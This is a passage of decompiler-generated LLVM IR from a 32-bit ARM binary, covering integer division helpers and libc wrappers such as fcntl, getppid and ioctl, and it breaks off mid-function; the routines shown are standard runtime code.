  %v0_fba8.pr36.ph = phi i32 [ %v4_fb88, %.thread ], [ %v1_fb74, %dec_label_pc_fb84 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_fb84 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_fba8.pr36 = phi i32 [ %v4_fb9c, %bb81 ], [ %v0_fba8.pr36.ph, %.preheader.preheader ]
  %v1_fba0 = phi i32 [ %v4_fba0, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_fb94 = icmp ugt i32 %v0_fba8.pr36, 268435455
  br i1 %v2_fb94, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_fba8thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_fb98 = icmp ult i32 %v0_fba8.pr36, %v0_fb74
  br i1 %v4_fb98, label %bb80, label %dec_label_pc_fba8thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_fb9c = and i32 %v0_fba8.pr36, 268435456
  %v3_fb9c = icmp eq i32 %v2_fb9c, 0
  %v4_fb9c = mul i32 %v0_fba8.pr36, 16
  br i1 %v3_fb9c, label %bb81, label %dec_label_pc_fba8.loopexit

bb81:                                             ; preds = %bb80
  %v2_fba0 = and i32 %v1_fba0, 268435456
  %v3_fba0 = icmp eq i32 %v2_fba0, 0
  %v4_fba0 = mul i32 %v1_fba0, 16
  br i1 %v3_fba0, label %.preheader, label %dec_label_pc_fba8thread-pre-split.loopexit.loopexit

dec_label_pc_fba8thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_fbb448.ph = phi i32 [ %v1_fba0, %bb ], [ %v4_fba0, %bb81 ]
  %v0_fba8.pr38.ph = phi i32 [ %v0_fba8.pr36, %bb ], [ %v4_fb9c, %bb81 ]
  br label %dec_label_pc_fba8thread-pre-split.loopexit

dec_label_pc_fba8thread-pre-split.loopexit:       ; preds = %dec_label_pc_fba8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_fbb448 = phi i32 [ %v1_fba0, %.thread2 ], [ %v1_fbb448.ph, %dec_label_pc_fba8thread-pre-split.loopexit.loopexit ]
  %v0_fba8.pr38 = phi i32 [ %v0_fba8.pr36, %.thread2 ], [ %v0_fba8.pr38.ph, %dec_label_pc_fba8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_fba8thread-pre-split

dec_label_pc_fba8thread-pre-split:                ; preds = %dec_label_pc_fba8thread-pre-split.loopexit, %bb83
  %v1_fbb446 = phi i32 [ %v1_fbb448, %dec_label_pc_fba8thread-pre-split.loopexit ], [ %v3_fbb4, %bb83 ]
  %v0_fba8.pr = phi i32 [ %v0_fba8.pr38, %dec_label_pc_fba8thread-pre-split.loopexit ], [ %v3_fbb0, %bb83 ]
  br label %dec_label_pc_fba8

dec_label_pc_fba8.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_fba8

dec_label_pc_fba8:                                ; preds = %dec_label_pc_fba8.loopexit, %dec_label_pc_fba8thread-pre-split
  %v1_fbb4 = phi i32 [ %v1_fbb446, %dec_label_pc_fba8thread-pre-split ], [ %v1_fba0, %dec_label_pc_fba8.loopexit ]
  %v1_fbb0 = phi i32 [ %v0_fba8.pr, %dec_label_pc_fba8thread-pre-split ], [ %v4_fb9c, %dec_label_pc_fba8.loopexit ]
  %v2_fba8 = icmp slt i32 %v1_fbb0, 0
  br i1 %v2_fba8, label %dec_label_pc_fbbc, label %bb82

bb82:                                             ; preds = %dec_label_pc_fba8
  %v4_fbac = icmp ult i32 %v1_fbb0, %v0_fb74
  br i1 %v4_fbac, label %bb83, label %dec_label_pc_fbbc

bb83:                                             ; preds = %bb82
  %v3_fbb0 = mul i32 %v1_fbb0, 2
  %v2_fbb4 = icmp slt i32 %v1_fbb4, 0
  %v3_fbb4 = mul i32 %v1_fbb4, 2
  br i1 %v2_fbb4, label %dec_label_pc_fbbc, label %dec_label_pc_fba8thread-pre-split

dec_label_pc_fbbc:                                ; preds = %bb82, %dec_label_pc_fba8, %bb83
  %v2_fbc859 = phi i32 [ %v3_fbb4, %bb83 ], [ %v1_fbb4, %bb82 ], [ %v1_fbb4, %dec_label_pc_fba8 ]
  %v1_fbc051 = phi i32 [ %v3_fbb0, %bb83 ], [ %v1_fbb0, %bb82 ], [ %v1_fbb0, %dec_label_pc_fba8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fbc0

dec_label_pc_fbc0:                                ; preds = %.thread11, %dec_label_pc_fbbc
  %v1_fbf4 = phi i32 [ %v4_fbf4, %.thread11 ], [ %v2_fbc859, %dec_label_pc_fbbc ]
  %v1_fbc8 = phi i32 [ %v0_fc00, %.thread11 ], [ 0, %dec_label_pc_fbbc ]
  %v1_fbf8 = phi i32 [ %v4_fbf8, %.thread11 ], [ %v1_fbc051, %dec_label_pc_fbbc ]
  %v1_fbc4 = phi i32 [ %v0_fbf0, %.thread11 ], [ %v0_fb74, %dec_label_pc_fbbc ]
  %v3_fbc0 = icmp ult i32 %v1_fbc4, %v1_fbf8
  br i1 %v3_fbc0, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_fbc0
  %v3_fbc4 = sub i32 %v1_fbc4, %v1_fbf8
  store i32 %v3_fbc4, i32* %r0.global-to-local, align 4
  %v3_fbc8 = or i32 %v1_fbc8, %v1_fbf4
  store i32 %v3_fbc8, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_fbc0, %bb84
  %v1_fbd0 = phi i32 [ %v1_fbc4, %dec_label_pc_fbc0 ], [ %v3_fbc4, %bb84 ]
  %v1_fbd4 = phi i32 [ %v1_fbc8, %dec_label_pc_fbc0 ], [ %v3_fbc8, %bb84 ]
  %v4_fbcc = udiv i32 %v1_fbf8, 2
  %v6_fbcc = icmp ult i32 %v1_fbd0, %v4_fbcc
  br i1 %v6_fbcc, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_fbd0 = urem i32 %v1_fbf8, 2
  %v4_fbd0 = icmp eq i32 %v3_fbd0, 0
  %v6_fbd0 = sub i32 %v1_fbd0, %v4_fbcc
  store i32 %v6_fbd0, i32* %r0.global-to-local, align 4
  br i1 %v4_fbd0, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_fbd4 = udiv i32 %v1_fbf4, 2
  %v6_fbd4 = or i32 %v1_fbd4, %v5_fbd4
  store i32 %v6_fbd4, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_fbdc = phi i32 [ %v6_fbd0, %bb85 ], [ %v1_fbd0, %.thread7 ], [ %v6_fbd0, %bb86 ]
  %v1_fbe0 = phi i32 [ %v1_fbd4, %bb85 ], [ %v1_fbd4, %.thread7 ], [ %v6_fbd4, %bb86 ]
  %v4_fbd8 = udiv i32 %v1_fbf8, 4
  %v6_fbd8 = icmp ult i32 %v1_fbdc, %v4_fbd8
  br i1 %v6_fbd8, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_fbdc = and i32 %v1_fbf8, 2
  %v4_fbdc = icmp eq i32 %v3_fbdc, 0
  %v6_fbdc = sub i32 %v1_fbdc, %v4_fbd8
  store i32 %v6_fbdc, i32* %r0.global-to-local, align 4
  br i1 %v4_fbdc, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_fbe0 = udiv i32 %v1_fbf4, 4
  %v6_fbe0 = or i32 %v1_fbe0, %v5_fbe0
  store i32 %v6_fbe0, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_fbe8 = phi i32 [ %v6_fbdc, %bb87 ], [ %v1_fbdc, %.thread8 ], [ %v6_fbdc, %bb88 ]
  %v1_fbec = phi i32 [ %v1_fbe0, %bb87 ], [ %v1_fbe0, %.thread8 ], [ %v6_fbe0, %bb88 ]
  %v4_fbe4 = udiv i32 %v1_fbf8, 8
  %v6_fbe4 = icmp ult i32 %v1_fbe8, %v4_fbe4
  br i1 %v6_fbe4, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_fbe8 = and i32 %v1_fbf8, 4
  %v4_fbe8 = icmp eq i32 %v3_fbe8, 0
  %v6_fbe8 = sub i32 %v1_fbe8, %v4_fbe4
  store i32 %v6_fbe8, i32* %r0.global-to-local, align 4
  br i1 %v4_fbe8, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_fbec = udiv i32 %v1_fbf4, 8
  %v6_fbec = or i32 %v1_fbec, %v5_fbec
  store i32 %v6_fbec, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_fc00 = phi i32 [ %v1_fbec, %bb89 ], [ %v1_fbec, %.thread9 ], [ %v6_fbec, %bb90 ]
  %v0_fbf0 = phi i32 [ %v6_fbe8, %bb89 ], [ %v1_fbe8, %.thread9 ], [ %v6_fbe8, %bb90 ]
  %v2_fbf0 = icmp eq i32 %v0_fbf0, 0
  br i1 %v2_fbf0, label %dec_label_pc_fc00, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_fbf4, 16
  br i1 %tmp138, label %dec_label_pc_fc00, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_fbf4 = udiv i32 %v1_fbf4, 16
  %v4_fbf8 = udiv i32 %v1_fbf8, 16
  br label %dec_label_pc_fbc0

dec_label_pc_fc00:                                ; preds = %thread-pre-split, %bb91
  store i32 %v0_fc00, i32* %r0.global-to-local, align 4
  ret i32 %v0_fc00

dec_label_pc_fc08:                                ; preds = %dec_label_pc_fb74
  %v9_fb74 = icmp eq i32 %v0_fb74, %v1_fb74
  %. = zext i1 %v9_fb74 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_fc14:                                ; preds = %dec_label_pc_fb7c
  %v2_fc14 = icmp ugt i32 %v1_fb74, 65535
  br i1 %v2_fc14, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_fc14
  %v2_fc18 = and i32 %v1_fb74, 32768
  %v3_fc18 = icmp eq i32 %v2_fc18, 0
  %v4_fc18 = udiv i32 %v1_fb74, 65536
  br i1 %v3_fc18, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_fc14
  %v0_fc2465 = phi i32 [ %v1_fb74, %dec_label_pc_fc14 ], [ %v4_fc18, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_fc28 = phi i32 [ %v0_fc2465, %.thread16 ], [ %v4_fc18, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_fc24 = icmp ugt i32 %v1_fc28, 255
  br i1 %v2_fc24, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_fc28 = and i32 %v1_fc28, 128
  %v3_fc28 = icmp eq i32 %v2_fc28, 0
  %v4_fc28 = udiv i32 %v1_fc28, 256
  br i1 %v3_fc28, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_fc2c = or i32 %storemerge, 8
  store i32 %v2_fc2c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_fc38 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_fc2c, %bb98 ]
  %v1_fc34 = phi i32 [ %v1_fc28, %bb96 ], [ %v4_fc28, %bb97 ], [ %v4_fc28, %bb98 ]
  %v2_fc30 = icmp ugt i32 %v1_fc34, 15
  br i1 %v2_fc30, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_fc34 = and i32 %v1_fc34, 8
  %v3_fc34 = icmp eq i32 %v2_fc34, 0
  %v4_fc34 = udiv i32 %v1_fc34, 16
  br i1 %v3_fc34, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_fc38 = add nsw i32 %v1_fc38, 4
  store i32 %v2_fc38, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_fc40 = phi i32 [ %v1_fc38, %.thread17 ], [ %v1_fc38, %bb99 ], [ %v2_fc38, %bb100 ]
  %v5_fc44 = phi i32 [ %v1_fc34, %.thread17 ], [ %v4_fc34, %bb99 ], [ %v4_fc34, %bb100 ]
  %v2_fc3c = icmp ugt i32 %v5_fc44, 3
  %v7_fc3c = icmp eq i32 %v5_fc44, 4
  %v2_fc40 = xor i1 %v7_fc3c, true
  %v3_fc40 = and i1 %v2_fc3c, %v2_fc40
  br i1 %v3_fc40, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_fc40 = add nsw i32 %v4_fc40, 3
  store i32 %v5_fc40, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_fc44 = phi i32 [ %v4_fc40, %.thread18 ], [ %v5_fc40, %bb101 ]
  %v2_fc44 = xor i1 %v2_fc3c, true
  %v3_fc44 = or i1 %v7_fc3c, %v2_fc44
  br i1 %v3_fc44, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_fc44 = udiv i32 %v5_fc44, 2
  %v9_fc44 = add i32 %v4_fc44, %v8_fc44
  store i32 %v9_fc44, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_fc48 = phi i32 [ %v4_fc44, %bb102 ], [ %v9_fc44, %bb103 ]
  %v6_fc48 = lshr i32 %v0_fb74, %v1_fc48
  store i32 %v6_fc48, i32* %r0.global-to-local, align 4
  ret i32 %v6_fc48

dec_label_pc_fc50:                                ; preds = %entry
  %v0_fc54 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_fc44, { 1, 0 }
  uselistorder i1 %v7_fc3c, { 1, 0 }
  uselistorder i32 %v4_fc34, { 1, 0 }
  uselistorder i32 %v1_fc34, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fc2c, { 1, 0 }
  uselistorder i32 %v4_fc28, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_fc28, { 1, 0, 2, 3 }
  uselistorder i32 %v4_fc18, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_fbf0, { 1, 0 }
  uselistorder i32 %v0_fc00, { 1, 0, 2 }
  uselistorder i32 %v4_fbe4, { 1, 0 }
  uselistorder i32 %v1_fbec, { 1, 2, 0 }
  uselistorder i32 %v4_fbd8, { 1, 0 }
  uselistorder i32 %v1_fbe0, { 1, 2, 0 }
  uselistorder i32 %v4_fbcc, { 1, 0 }
  uselistorder i32 %v1_fbd4, { 1, 2, 0 }
  uselistorder i32 %v1_fbf8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_fbc8, { 1, 0 }
  uselistorder i32 %v1_fbf4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_fbb4, { 1, 0 }
  uselistorder i32 %v3_fbb0, { 1, 0 }
  uselistorder i32 %v1_fbb0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_fbb4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_fba0, { 1, 0 }
  uselistorder i32 %v4_fb9c, { 2, 1, 0 }
  uselistorder i32 %v1_fba0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_fba8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_fb74, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_fb74, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_fb68, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 90, 0, 1, 12, 11, 2, 3, 42, 43, 22, 44, 21, 45, 14, 13, 4, 24, 46, 23, 47, 49, 15, 48, 5, 50, 51, 26, 52, 25, 53, 54, 55, 56, 27, 57, 58, 16, 59, 6, 30, 60, 61, 62, 29, 63, 28, 64, 66, 17, 65, 7, 67, 68, 34, 69, 31, 70, 32, 71, 33, 72, 18, 73, 74, 35, 75, 36, 76, 79, 80, 19, 77, 78, 8, 39, 81, 37, 82, 38, 83, 85, 20, 84, 9, 10, 86, 87, 41, 88, 40, 89 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_fc00, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_fbbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fba8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_fc68 = udiv i32 %arg1, %arg2
  ret i32 %v2_fc68
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_fc84 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_fc84
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_fca0 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_fca0, 2
  br i1 %tmp, label %dec_label_pc_fcdc, label %dec_label_pc_fcb8

dec_label_pc_fcb8:                                ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_fd10, label %dec_label_pc_fccc

dec_label_pc_fccc:                                ; preds = %dec_label_pc_fcb8
  %v0_fcd0 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_fd04

dec_label_pc_fcdc:                                ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_fcf8, label %dec_label_pc_fd10

dec_label_pc_fcf8:                                ; preds = %dec_label_pc_fcdc
  %v0_fcfc = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_fd04

dec_label_pc_fd04:                                ; preds = %dec_label_pc_fccc, %dec_label_pc_fcf8
  %storemerge2 = phi i32 [ %v0_fcd0, %dec_label_pc_fccc ], [ %v0_fcfc, %dec_label_pc_fcf8 ]
  %storemerge.in = load i16, i16* @global_var_20d6c.590, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_fd04 = load i32, i32* %r2.global-to-local, align 4
  %v1_fd04 = sub i32 0, %v0_fd04
  store i32 %v1_fd04, i32* %r2.global-to-local, align 4
  %v3_fd08 = add i32 %storemerge, %storemerge2
  %v4_fd08 = inttoptr i32 %v3_fd08 to i32*
  store i32 %v1_fd04, i32* %v4_fd08, align 4
  br label %dec_label_pc_fd10

dec_label_pc_fd10:                                ; preds = %dec_label_pc_fcb8, %dec_label_pc_fcdc, %dec_label_pc_fd04
  %storemerge1 = phi i32 [ -1, %dec_label_pc_fd04 ], [ %arg1, %dec_label_pc_fcdc ], [ %arg1, %dec_label_pc_fcb8 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 5, 1, 4 }
  uselistorder label %dec_label_pc_fd10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fd04, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_fd28 = load i32, i32* @r2, align 4
  %v9_fd28 = load i32, i32* @r3, align 4
  store i32 %v9_fd28, i32* %stack_var_-4, align 4
  %v3_fd2c = load i32, i32* @r4, align 4
  store i32 %v3_fd2c, i32* %stack_var_-32, align 4
  %v6_fd2c = load i32, i32* @r5, align 4
  %v12_fd2c = load i32, i32* @r7, align 4
  %v4_fd3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12828) to i32*), align 4
  %v2_fd44 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fd44, i32* @r3, align 4
  %v2_fd48 = icmp eq i32 %v4_fd3c, 0
  %v0_fd50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fd50, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_fd28, i32* @r4, align 4
  br i1 %v2_fd48, label %dec_label_pc_fd6c, label %dec_label_pc_fd60

dec_label_pc_fd60:                                ; preds = %entry
  %v7_fd60 = icmp eq i32 %arg2, 7
  br i1 %v7_fd60, label %dec_label_pc_fdac, label %bb

bb:                                               ; preds = %dec_label_pc_fd60
  %v8_fd64 = icmp eq i32 %arg2, 14
  br i1 %v8_fd64, label %dec_label_pc_fdac, label %dec_label_pc_fd6c

dec_label_pc_fd6c:                                ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_fd50, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_fd50, -4095
  br i1 %tmp, label %dec_label_pc_fda4, label %dec_label_pc_fd8c

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fd6c
  %v0_fd90 = call i32 @__aeabi_read_tp()
  %v3_fd94 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_fd94 = sext i16 %v3_fd94 to i32
  store i32 %v4_fd94, i32* @r3, align 4
  %v0_fd98 = load i32, i32* @r2, align 4
  %v1_fd98 = sub i32 0, %v0_fd98
  store i32 %v1_fd98, i32* @r2, align 4
  %v3_fd9c = add i32 %v4_fd94, %v0_fd90
  %v4_fd9c = inttoptr i32 %v3_fd9c to i32*
  store i32 %v1_fd98, i32* %v4_fd9c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fda4

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fd6c, %dec_label_pc_fd8c
  %v0_fda4 = phi i32 [ %v0_fd50, %dec_label_pc_fd6c ], [ -1, %dec_label_pc_fd8c ]
  br label %dec_label_pc_fdf8

dec_label_pc_fdac:                                ; preds = %dec_label_pc_fd60, %bb
  %v0_fdac = call i32 @__libc_enable_asynccancel()
  %v0_fdb0 = load i32, i32* @r7, align 4
  store i32 %v0_fdb0, i32* @r1, align 4
  store i32 %v0_fdac, i32* %r6.global-to-local, align 4
  %v0_fdbc = load i32, i32* @r5, align 4
  store i32 %v0_fdbc, i32* %r0.global-to-local, align 4
  store i32 %v0_fdbc, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_fdbc, -4095
  br i1 %tmp15, label %dec_label_pc_fdec, label %dec_label_pc_fdd4

dec_label_pc_fdd4:                                ; preds = %dec_label_pc_fdac
  %v1_fdd8 = sub i32 0, %v0_fdbc
  %v0_fddc = call i32 @__aeabi_read_tp()
  store i32 %v0_fddc, i32* %r0.global-to-local, align 4
  %v3_fde0 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_fde0 = sext i16 %v3_fde0 to i32
  store i32 %v4_fde0, i32* @r3, align 4
  %v3_fde4 = add i32 %v4_fde0, %v0_fddc
  %v4_fde4 = inttoptr i32 %v3_fde4 to i32*
  store i32 %v1_fdd8, i32* %v4_fde4, align 4
  store i32 -1, i32* @r2, align 4
  %v0_fdec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fdec

dec_label_pc_fdec:                                ; preds = %dec_label_pc_fdac, %dec_label_pc_fdd4
  %v0_fdf0 = phi i32 [ %v0_fdbc, %dec_label_pc_fdac ], [ -1, %dec_label_pc_fdd4 ]
  %v0_fdec = phi i32 [ %v0_fdac, %dec_label_pc_fdac ], [ %v0_fdec.pre, %dec_label_pc_fdd4 ]
  store i32 %v0_fdec, i32* %r0.global-to-local, align 4
  store i32 %v0_fdf0, i32* @r7, align 4
  %v1_fdf4 = call i32 @__libc_disable_asynccancel(i32 %v0_fdec)
  store i32 %v1_fdf4, i32* %r0.global-to-local, align 4
  %v0_fdf8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fdf8

dec_label_pc_fdf8:                                ; preds = %dec_label_pc_fda4, %dec_label_pc_fdec
  %v0_fdf8 = phi i32 [ %v0_fda4, %dec_label_pc_fda4 ], [ %v0_fdf8.pre, %dec_label_pc_fdec ]
  store i32 %v0_fdf8, i32* %r0.global-to-local, align 4
  %v2_fe00 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_fe00, i32* @r4, align 4
  store i32 %v6_fd2c, i32* @r5, align 4
  store i32 %v12_fd2c, i32* @r7, align 4
  ret i32 %v0_fdf8

; uselistorder directives
  uselistorder i32 %v0_fdf8, { 1, 0 }
  uselistorder i32 %v0_fdec, { 1, 0 }
  uselistorder i32 %v0_fdbc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_fd50, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_fdf8, { 1, 0 }
  uselistorder label %dec_label_pc_fdec, { 1, 0 }
  uselistorder label %dec_label_pc_fdac, { 1, 0 }
  uselistorder label %dec_label_pc_fda4, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_fe2c = load i32, i32* @r0, align 4
  ret i32 %v1_fe2c
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_fe30 = load i32, i32* @r3, align 4
  store i32 %v9_fe30, i32* %stack_var_-4, align 4
  %v3_fe34 = load i32, i32* @r4, align 4
  store i32 %v3_fe34, i32* %stack_var_-32, align 4
  %v6_fe34 = load i32, i32* @r5, align 4
  %v12_fe34 = load i32, i32* @r7, align 4
  %v4_fe44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12828) to i32*), align 4
  %v2_fe4c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fe4c, i32* @r3, align 4
  %v2_fe50 = icmp eq i32 %v4_fe44, 0
  %v0_fe58 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fe58, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_fe50, label %dec_label_pc_fe68, label %dec_label_pc_fea0

dec_label_pc_fe68:                                ; preds = %entry
  %tmp = icmp ult i32 %v0_fe58, -4095
  br i1 %tmp, label %dec_label_pc_fe98, label %dec_label_pc_fe80

dec_label_pc_fe80:                                ; preds = %dec_label_pc_fe68
  %v1_fe84 = sub i32 0, %v0_fe58
  %v3_fe88 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_fe88 = sext i16 %v3_fe88 to i32
  store i32 %v4_fe88, i32* @r3, align 4
  %v0_fe8c = call i32 @__aeabi_read_tp()
  %v2_fe90 = load i32, i32* @r3, align 4
  %v3_fe90 = add i32 %v2_fe90, %v0_fe8c
  %v4_fe90 = inttoptr i32 %v3_fe90 to i32*
  store i32 %v1_fe84, i32* %v4_fe90, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fe98

dec_label_pc_fe98:                                ; preds = %dec_label_pc_fe68, %dec_label_pc_fe80
  %v0_fe98 = phi i32 [ %v0_fe58, %dec_label_pc_fe68 ], [ -1, %dec_label_pc_fe80 ]
  br label %dec_label_pc_feec

dec_label_pc_fea0:                                ; preds = %entry
  %v0_fea0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_fea0, i32* %r6.global-to-local, align 4
  %v0_feb0 = load i32, i32* @r4, align 4
  store i32 %v0_feb0, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_feb0, -4095
  br i1 %tmp15, label %dec_label_pc_fee0, label %dec_label_pc_fec8

dec_label_pc_fec8:                                ; preds = %dec_label_pc_fea0
  %v1_fecc = sub i32 0, %v0_feb0
  %v3_fed0 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_fed0 = sext i16 %v3_fed0 to i32
  store i32 %v4_fed0, i32* @r3, align 4
  %v0_fed4 = call i32 @__aeabi_read_tp()
  store i32 %v0_fed4, i32* %r0.global-to-local, align 4
  %v2_fed8 = load i32, i32* @r3, align 4
  %v3_fed8 = add i32 %v2_fed8, %v0_fed4
  %v4_fed8 = inttoptr i32 %v3_fed8 to i32*
  store i32 %v1_fecc, i32* %v4_fed8, align 4
  %v0_fee0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fee0

